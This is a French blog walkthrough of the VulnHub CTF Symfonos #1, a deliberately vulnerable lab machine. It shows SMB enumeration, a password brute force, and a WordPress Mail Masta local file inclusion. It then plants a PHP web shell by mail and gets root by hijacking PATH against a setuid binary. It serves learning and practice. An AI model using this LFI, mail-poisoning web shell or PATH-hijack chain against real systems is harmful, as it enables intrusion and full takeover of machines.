# Solution du CTF Symfonos #1 de VulnHub

[symfonos: 1](https://vulnhub.com/entry/symfonos-1,322/) est le premier d'une série de CTFs conçus par `Zayotic`.

```
Nmap scan report for 192.168.56.112
Host is up (0.00010s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:19:BE:31 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h59m58s, deviation: 3h27m51s, median: 59m58s
| smb2-time: 
|   date: 2023-02-20T07:49:51
|_  start_date: N/A
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2023-02-20T01:49:51-06:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

## Pare soleil

Je me penche directement sur le SMB pour énumérer les comptes existants :

```shellsession
$ sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 192.168.56.112
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 07:51 CET
Nmap scan report for 192.168.56.112
Host is up (0.00036s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
137/udp open  netbios-ns
MAC Address: 08:00:27:19:BE:31 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-enum-users: 
|   SYMFONOS\helios (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
```

Il y a donc un utilisateur `helios`. Voyons maintenant les partages :

```shellsession
$ smbclient -U "" -N -L //192.168.56.112

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
$ smbclient -U "" -N //192.168.56.112/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 03:14:49 2019
  ..                                  D        0  Sat Jun 29 03:12:15 2019
  attention.txt                       N      154  Sat Jun 29 03:14:49 2019

                19994224 blocks of size 1024. 17304320 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 154 as attention.txt (37,6 KiloBytes/sec) (average 37,6 KiloBytes/sec)
```

Il y a un fichier texte sur le partage `anonymous`. L'accès au partage `helios` refuse quand à lui la connexion anonyme.

J'avais lancé une attaque brute force avec mon outil [GitHub - devl00p/brute_smb_share: Brute force a SMB share](https://github.com/devl00p/brute_smb_share) qui trouve immédiatement le mot de passe de `helios` :

```shellsession
$ python3 brute_smb_share.py 192.168.56.112 helios users.txt rockyou.txt 
Success with user helios and password qwerty
        research.txt
        todo.txt
```

Cependant le mot de passe était aussi mentionné dans le fichier `attention.txt` :

> Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!    
> 
> Next person I find using one of these passwords will be fired!  
> 
> -Zeus

Les nouveaux fichiers texte auquel on a accès sont une description du dieu `Helios` (`research.txt`) :

> Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at  
> night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.

Ainsi qu'une `todo` mentionnant un path sur le serveur web :

> 1. Binge watch Dexter  
> 2. Dance  
> 3. Work on /h3l105

A cette adresse on trouve un Wordpress qui semble configuré pour le nom d'hôte `symfonos.local`.

## You got mail

Il est important de le spécifier lors du scan avec `WPscan` sans quoi l'énumération ne retourne rien.

```bash
docker run --add-host symfonos.local:192.168.56.112 -it --rm wpscanteam/wpscan --url http://symfonos.local/h3l105/ -e ap,at,u
```

On trouve un étrange plugin nommé `mail-masta` :

```
[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
```

A priori c'est un véritable gruyère. On peut par exemple utiliser une faille d'inclusion PHP : [WordPress Plugin Mail Masta 1.0 - Local File Inclusion - PHP webapps Exploit](https://www.exploit-db.com/exploits/40290)

Le PoC fonctionne très bien pour lire `/etc/passwd`.

http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

Comme il y a un service SMTP en écoute on est tenté d'inclure un fichier de mail du système. Ca échoue avec `www-data`  mais j'obtiens bien des données avec `/var/spool/mail/helios` :

```html
--2EE7C40AB0.1676879280/symfonos.localdomain
Content-Description: Undelivered Message
Content-Type: message/rfc822
Content-Transfer-Encoding: 8bit

Return-Path: <helios@symfonos.localdomain>
Received: by symfonos.localdomain (Postfix, from userid 1000)
	id 2EE7C40AB0; Fri, 28 Jun 2019 19:46:02 -0500 (CDT)
To: helios@blah.com
Subject: New WordPress Site
X-PHP-Originating-Script: 1000:class-phpmailer.php
Date: Sat, 29 Jun 2019 00:46:02 +0000
From: WordPress <wordpress@192.168.201.134>
Message-ID: <65c8fc37d21cc0046899dadd559f3bd1@192.168.201.134>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

http://192.168.201.134/h3l105

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during installation.
Log in here: http://192.168.201.134/h3l105/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/


--2EE7C40AB0.1676879280/symfonos.localdomain--
```

L'idée m'est venue de déclencher la réinitialisation du mot de passe Wordpress et d'aller récupérer le lien pour changer le mot de passe mais le compte semble avoir été enregistré avec une adresse invalide (`helios@blah.com`) par conséquent ce n'est pas possible.

A la place je vais envoyer un mail à `Helios` tout comme j'avais procédé sur le [CTF Underdist #3](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Underdist%20%233%20de%20VulnHub.md) :

```shellsession
$ ncat 192.168.56.112 25 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.112:25.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
HELO symfonos.localdomain
250 symfonos.localdomain
MAIL FROM: yolo@yolo.tld
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<pre><?php system($_GET["cmd"]); ?></pre>
.
250 2.0.0 Ok: queued as 3689B406AE
QUIT
221 2.0.0 Bye
```

On obtient un shell en tant que `helios`. Apache tourne effectivement avec cet utilisateur :

`helios    2106  7.6  2.7 272524 28296 ?        S    02:39   7:38 /usr/sbin/apache2 -k start`

## Hammer Time

Une énumération des binaires setuid remonte un fichier inhabituel :

```shellsession
helios@symfonos:~$ find / -type f -perm -u+s -ls 2> /dev/null 
   525788     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   529794     44 -rwsr-xr--   1 root     messagebus    42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   403969    432 -rwsr-xr-x   1 root     root         440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
   393297     60 -rwsr-xr-x   1 root     root          59680 May 17  2017 /usr/bin/passwd
   393296     76 -rwsr-xr-x   1 root     root          75792 May 17  2017 /usr/bin/gpasswd
   396158     40 -rwsr-xr-x   1 root     root          40312 May 17  2017 /usr/bin/newgrp
   393294     40 -rwsr-xr-x   1 root     root          40504 May 17  2017 /usr/bin/chsh
   393293     52 -rwsr-xr-x   1 root     root          50040 May 17  2017 /usr/bin/chfn
   131108     12 -rwsr-xr-x   1 root     root           8640 Jun 28  2019 /opt/statuscheck
   655404     44 -rwsr-xr-x   1 root     root          44304 Mar  7  2018 /bin/mount
   655405     32 -rwsr-xr-x   1 root     root          31720 Mar  7  2018 /bin/umount
   655402     40 -rwsr-xr-x   1 root     root          40536 May 17  2017 /bin/su
   655427     60 -rwsr-xr-x   1 root     root          61240 Nov 10  2016 /bin/ping
```

Il ne semble qu'appeller `curl` :

```shellsession
helios@symfonos:~$ strings /opt/statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
--- snip ---
```

On va détourner l'exécution en compilant un programme nommé `curl` et en le mettant sur le `PATH` :

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(0, 0);
        setregid(0, 0);
        system("/bin/bash -p");
}
```

Et c'est dans la poche :

```shellsession
helios@symfonos:~$ export PATH=.:$PATH
helios@symfonos:~$ gcc -o curl curl.c
helios@symfonos:~$ /opt/statuscheck
root@symfonos:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(helios)
root@symfonos:~# cd /root
root@symfonos:/root# ls
proof.txt
root@symfonos:/root# cat proof.txt 

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!
```

*Publié le 20 février 2023*
